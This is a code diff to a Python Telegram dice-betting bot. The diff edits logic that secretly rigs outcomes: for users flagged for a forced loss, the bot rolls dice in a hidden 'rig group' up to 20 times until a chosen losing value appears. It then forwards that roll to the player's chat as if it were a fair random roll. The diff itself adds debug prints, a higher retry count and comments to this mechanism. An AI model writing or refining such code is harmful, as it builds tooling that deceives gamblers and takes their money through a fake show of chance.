@@ -11,7 +11,6 @@ from wallet import (
 )
 from settings import get_min_bet, get_max_bet
 
-# Secret Rig Group ID
 RIG_GROUP_ID = int(os.getenv("RIG_GROUP_ID", "-1004291076026"))
 
 # --- RIGGING CHECK ---
@@ -20,7 +19,8 @@ def get_rigged_target(user_id: int) -> bool | None:
     try:
         from settings import get_user_rig_status
         return get_user_rig_status(user_id)
-    except Exception:
+    except Exception as e:
+        print(f"DEBUG: Error fetching rig status: {e}")
         return None
 
 # --- EVALUATION LOGIC ---
@@ -81,24 +81,25 @@ def validate_bet_amount(user_id: int, amount: float) -> tuple[bool, str]:
 
 def send_dice_animation(chat_id: int, user_id: int, bet_choice: str) -> int:
     rig_status = get_rigged_target(user_id)
+    print(f"DEBUG: User {user_id} | Bet: {bet_choice} | Rig Status: {rig_status}")
 
+    # Explicitly check for forced loss (rig_status is False)
     if rig_status is False:
         try:
             target_val = generate_dice_roll(user_id, bet_choice)
-            print(f"DEBUG: Attempting rig roll for user {user_id} in RIG_GROUP_ID: {RIG_GROUP_ID}")
+            print(f"DEBUG: Rolling in RIG_GROUP_ID ({RIG_GROUP_ID}) for forced lose value {target_val}...")
 
-            for i in range(1, 16):
+            for i in range(1, 20):
                 msg = bot.send_dice(RIG_GROUP_ID, emoji="🎲")
                 if msg.dice.value == target_val:
-                    print(f"DEBUG: Target dice value {target_val} hit on attempt {i}!")
+                    print(f"DEBUG: Found target {target_val} on attempt {i}. Forwarding to chat {chat_id}.")
                     bot.copy_message(chat_id, RIG_GROUP_ID, msg.message_id)
                     return target_val
 
         except Exception as e:
-            # Prints full raw exception directly in Termux console
-            print(f"❌ [RIG ERROR] Failed to send dice to group {RIG_GROUP_ID}: {e}")
-            logging.error(f"RIG GROUP ERROR: {e}", exc_info=True)
+            print(f"❌ [RIG ERROR] Direct API Failure in group {RIG_GROUP_ID}: {e}")
 
+    # Fallback / Unrigged
     msg = bot.send_dice(chat_id, emoji="🎲")
     return msg.dice.value
 
@@ -239,6 +240,6 @@ def handle_dr_callback(call: CallbackQuery):
 
     process_dice_bet(call.message.chat.id, user_id, amount, choice)
 
-# --- BACKWARD COMPATIBILITY ALIASES ---
+# Aliases
 play_dice_roll = process_dice_bet
 handle_dice_roll = handle_dr_command
